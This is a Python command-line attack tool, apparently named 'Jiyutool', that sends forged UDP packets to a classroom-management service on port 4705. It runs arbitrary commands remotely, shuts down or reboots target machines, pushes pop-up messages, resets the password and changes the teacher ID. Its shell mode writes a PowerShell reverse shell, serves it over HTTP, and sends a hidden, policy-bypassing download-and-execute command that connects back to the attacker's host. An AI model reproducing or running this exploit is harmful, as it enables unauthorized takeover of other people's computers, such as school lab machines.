import socket
import random
import os
import time
from multiprocessing import Process
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
import argparse


flag = 0


def padding(data, pad_len):
    data_len = len(data)
    if data_len < pad_len:
        data += [0x00] * (pad_len - data_len)
    return data



def command_pack(command):
    code = [
            0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
            0x6e, 0x03, 0x00, 0x00, 0xa6, 0x2e, 0x33, 0xa1, 
            0x0d, 0xcd, 0xdc, 0x4d, 0xb1, 0x3c, 0x3f, 0x1b, 
            0x69, 0x58, 0x3d, 0x38, 0x20, 0x4e, 0x00, 0x00, 
            0x0a, 0x14, 0x49, 0x24, 0x61, 0x03, 0x00, 0x00, 
            0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 
            0x01, 0x00, 0x00, 0x00
            ]
    global flag
    if flag:
        code = [
                0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
                0x6e, 0x03, 0x00, 0x00, 0xb4, 0x30, 0xe7, 0x2e, 
                0x54, 0xc4, 0x7a, 0x49, 0xa0, 0x60, 0xee, 0x52, 
                0x95, 0xcb, 0x1a, 0xd2, 0x20, 0x4e, 0x00, 0x00, 
                0x0a, 0x14, 0x49, 0x24, 0x61, 0x03, 0x00, 0x00,  
                0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 
                0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 
                0x01, 0x00, 0x00, 0x00]
    flag ^= 1
    payload = code
    app = ''
    parameter = ''
    try:
        app = command.split(' ', 1)[0]
        parameter = command.split(' ', 1)[1]
    except:
        pass

    for i in app: 
        payload.append(int(ord(i)))
        payload.append(0x00)
    
    command_len=572
    max_len = 906

    if len(payload) <= 572:
        payload = padding(payload, command_len)
    
    if parameter:
        for i in parameter:
            payload.append(int(ord(i)))
            payload.append(0x00)
    payload = padding(payload, max_len)
    return bytes(payload)




def reset_passwrod(password):
    code = [
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
        0x95, 0x00, 0x00, 0x00, 0x50, 0x25, 0x20, 0x1f, 
        0x8b, 0xd4, 0x14, 0x43, 0xbb, 0xd1, 0xf8, 0x00, 
        0x4b, 0x71, 0xeb, 0xa1, 0x20, 0x4e, 0x00, 0x00, 
        0x0a, 0x14, 0x49, 0x24, 0x88, 0x00, 0x00, 0x00, 
        0x88, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 
        0x7b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x01, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 
        0x50, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
    ]
    max_len = 177
    for i in password:
        code.append(int(ord(i)))
        code.append(0x00)
    
    if len(code) < max_len:
        code = padding(code, max_len)

    return bytes(code)


def  modify_teacher_id(id):
    code = [
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
        0x2f, 0x00, 0x00, 0x00, 0x7c, 0xa0, 0xe1, 0xa6, 
        0x69, 0x64, 0x65, 0x4b, 0x91, 0x37, 0xd7, 0xb8, 
        0xbd, 0xd2, 0x00, 0x7c, 0x20, 0x4e, 0x00, 0x00, 
        0xc0, 0xa8, 0x4a, 0x87, 0x22, 0x00, 0x00, 0x00, 
        0x22, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 
        0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x01, 0x00, 0x00, 0x00
    ]
    max_len = 75
    if id > 32:
        return False
    code.append(id)
    payload = bytes(code) + b"\x00" * (max_len - len(code))

    return payload
 

def power(choose=1):
    #choose == 1 关机 choose=0重启
    
    code = [
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
        0x2a, 0x02, 0x00, 0x00, 0x80, 0x10, 0x49, 0x33, 
        0x4e, 0xa1, 0x83, 0x49, 0x8f, 0xe8, 0xe6, 0x72, 
        0xac, 0x89, 0xb0, 0xbc, 0x20, 0x4e, 0x00, 0x00, 
        0xc0, 0xa8, 0x4a, 0x87, 0x1d, 0x02, 0x00, 0x00, 
        0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x10, 
        0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 
        0x06, 0x5c, 0x73, 0x51, 0xed, 0x95, 0xa8, 0x60, 
        0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 
        0x02, 0x30,
    ]
    if choose == 0 :
        code = [
            0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
            0x2a, 0x02, 0x00, 0x00, 0x4b, 0x8f, 0x5c, 0xa1, 
            0x48, 0xcf, 0xda, 0x4e, 0x80, 0x03, 0x09, 0x9e, 
            0xca, 0xda, 0x7a, 0x94, 0x20, 0x4e, 0x00, 0x00, 
            0xc0, 0xa8, 0x4a, 0x87, 0x1d, 0x02, 0x00, 0x00, 
            0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x10, 
            0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 
            0x06, 0x5c, 0xcd, 0x91, 0x2f, 0x54, 0xa8, 0x60, 
            0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 
            0x02, 0x30, 
        ]
        


    payload = bytes(code) 
    payload  += b"\x00" * (582 - len(payload))

    return payload


def message_pack(message):
    code = [
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 
        0x9e, 0x03, 0x00, 0x00, 0xcf, 0x6b, 0xdd, 0x5f, 
        0x29, 0xcb, 0x50, 0x46, 0x9f, 0xbc, 0xf7, 0xe7, 
        0x65, 0x5e, 0x00, 0x8a, 0x20, 0x4e, 0x00, 0x00, 
        0x0a, 0x14, 0x49, 0x24, 0x91, 0x03, 0x00, 0x00, 
        0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    ]

    max_len = 954

    payload = bytes(code) + message.encode("utf-16le")
    payload_len = len(payload)
    if payload_len < max_len:
        payload += b'\x00' * (max_len -payload_len)

    return payload


def send(ip,payload,port=4705):
    target_ip = ip
    target_port = port
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(payload, (target_ip, target_port))
    sock.close()
    print("发送成功")


def get_random_available_port(min_port=4001, max_port=65535):
    while True:
        port = random.randint(min_port, max_port)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(('', port))
                return port
            except OSError:
                continue

def start_http_server(port):
    handler = SimpleHTTPRequestHandler
    with TCPServer(("", port), handler) as httpd:
        print(f"HTTP 服务运行中：端口 {port}")
        httpd.serve_forever()



def get_shell(target_ip, target_port=4705,rhost="127.0.0.1" ):
    rport = get_random_available_port()
    shell = f'''$client = New-Object System.Net.Sockets.TCPClient("{rhost}", {rport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close()
'''
    with open("./re.ps1", "w") as file:
        file.write(shell)
    http_port = 8000
    http_server = Process(target=start_http_server, args=(http_port,))
    http_server.start()

    time.sleep(2)

    os.system(f'start cmd /k python listener.py {rport}')
    time.sleep(1)
    
    payload = command_pack(f'''powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://{rhost}:{http_port}/re.ps1')"''')
    
    send(target_ip,payload,target_port)
    time.sleep(5)
    http_server.terminate()
    http_server.join()

  

def main():
    parser = argparse.ArgumentParser(description="Jiyutool")
    parser.add_argument('--ip', required=True, help='目标IP地址')
    parser.add_argument('--port', type=int, default=4705, help='目标端口，默认4705')

    subparsers = parser.add_subparsers(dest='command', help='操作命令')

    # 1. 关机或重启
    shutdown_parser = subparsers.add_parser('power', help='关机或重启')
    shutdown_parser.add_argument('--shutdown', action='store_true', help='关机，默认是重启')

    # 2. 执行命令
    cmd_parser = subparsers.add_parser('exec', help='远程执行命令')
    cmd_parser.add_argument('--cmd', required=True, help='要执行的命令')

    # 3. 获取shell
    shell_parser = subparsers.add_parser('shell', help='反向Shell连接')
    shell_parser.add_argument('--lhost', default='127.0.0.1', help='监听主机地址')
    
    # 4. 发送消息
    msg_parser = subparsers.add_parser('message', help='发送弹窗消息')
    msg_parser.add_argument('--msg', required=True, help='消息内容')

    # 5. 重置密码
    reset_parser = subparsers.add_parser('reset', help='重置密码')
    reset_parser.add_argument('--pwd', required=True, help='新密码')

    # 6. 修改教师ID
    id_parser = subparsers.add_parser('id', help='修改教师ID')
    id_parser.add_argument('--tid', type=int, required=True, help='教师ID，必须 <= 32')

    args = parser.parse_args()

    if args.command == 'power':
        payload = power(1 if args.shutdown else 0)
        send(args.ip, payload, args.port)

    elif args.command == 'exec':
        payload = command_pack(args.cmd)
        send(args.ip, payload, args.port)

    elif args.command == 'shell':
        get_shell(args.ip, args.port, args.lhost)

    elif args.command == 'message':
        payload = message_pack(args.msg)
        send(args.ip, payload, args.port)

    elif args.command == 'reset':
        payload = reset_passwrod(args.pwd)
        send(args.ip, payload, args.port)

    elif args.command == 'id':
        payload = modify_teacher_id(args.tid)
        if payload:
            send(args.ip, payload, args.port)
        else:
            print("教师ID必须小于等于32")

    else:
        parser.print_help()



if __name__ == '__main__':
    main()